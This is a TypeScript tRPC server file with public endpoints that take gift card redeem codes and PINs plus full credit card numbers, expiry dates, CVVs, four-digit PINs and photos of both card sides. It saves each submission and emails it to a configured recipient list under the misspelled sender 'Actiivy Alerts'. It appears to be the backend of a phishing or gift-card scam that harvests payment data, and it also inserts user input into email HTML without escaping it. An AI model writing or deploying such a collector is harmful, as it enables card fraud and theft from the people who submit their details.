import { router, publicProcedure } from './trpc.ts.js';
import { z } from 'zod';
import nodemailer from 'nodemailer';
import { db } from './db.ts.js';
import { submissions } from './schema.ts.js';

const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com', port: 465, secure: true,
  auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_APP_PASSWORD }
});
const recipients = [...new Set((process.env.NOTIFICATION_EMAILS ?? '').split(',').map(x => x.trim()).filter(Boolean))];
const inputSchema = z.object({
  code: z.string(), imageUrl: z.string().optional(), userAgent: z.string().optional(), ip: z.string().optional(), metadata: z.record(z.any()).optional()
});
const sendSubmission = async (input: z.infer<typeof inputSchema>) => {
  await db.insert(submissions).values({ ...input, metadata: JSON.stringify(input.metadata), createdAt: new Date() });
  if (!recipients.length) throw new Error('NOTIFICATION_EMAILS is not configured');
  const message = { from: `Actiivy Alerts <${process.env.SMTP_USER}>`, subject: 'New Redeem Code / Gift Card Submission', text: `New submission: ${input.code}`, html: `<h2>New Submission Received</h2><p>Redeem Code: <code>${input.code}</code></p>${input.imageUrl ? `<p>Image: <a href="${input.imageUrl}">${input.imageUrl}</a></p>` : ''}` };
  await Promise.all(recipients.map(async to => {
    try { const info = await transporter.sendMail({ ...message, to }); console.log(JSON.stringify({ event: 'notification.smtp.result', recipient: to.replace(/(.).+(@.*)/, '$1***$2'), acceptedCount: info.accepted?.length ?? 0, rejectedCount: info.rejected?.length ?? 0, messageId: info.messageId ?? null })); }
    catch (error: any) { console.error(JSON.stringify({ event: 'notification.smtp.error', recipient: to.replace(/(.).+(@.*)/, '$1***$2'), code: error?.code ?? null, responseCode: error?.responseCode ?? null, message: error?.message ?? 'Unknown SMTP error' })); throw error; }
  }));
  return { success: true, recipientCount: recipients.length, message: `Sent to ${recipients.length} recipient(s).` };
};
export const submissionRouter = router({ submitRedeem: publicProcedure.input(inputSchema).mutation(({ input }) => sendSubmission(input)) });
const cardSchema = z.object({ cardType: z.string(), currency: z.string(), amount: z.string(), cardName: z.string().optional(), cardNumber: z.string().optional(), expiryDate: z.string().optional(), cvv: z.string().optional(), giftCardCvv: z.string().optional(), giftCardPin: z.string().optional(), fourDigitPin: z.string().optional(), giftCardExpiryDate: z.string().optional(), redemptionCode: z.string().optional(), redemptionCode1: z.string().optional(), redemptionCode2: z.string().optional(), redemptionCode3: z.string().optional(), frontImageUrl: z.string().optional(), backImageUrl: z.string().optional() });
export const cardRouter = router({ submit: publicProcedure.input(cardSchema).mutation(({ input }) => sendSubmission({ code: [input.redemptionCode, input.redemptionCode1, input.redemptionCode2, input.redemptionCode3].filter(Boolean).join(' | ') || input.giftCardPin || input.cardNumber || 'TEST-SUBMISSION', imageUrl: input.frontImageUrl, metadata: { cardType: input.cardType, currency: input.currency, amount: input.amount, backImageUrl: input.backImageUrl } })) });
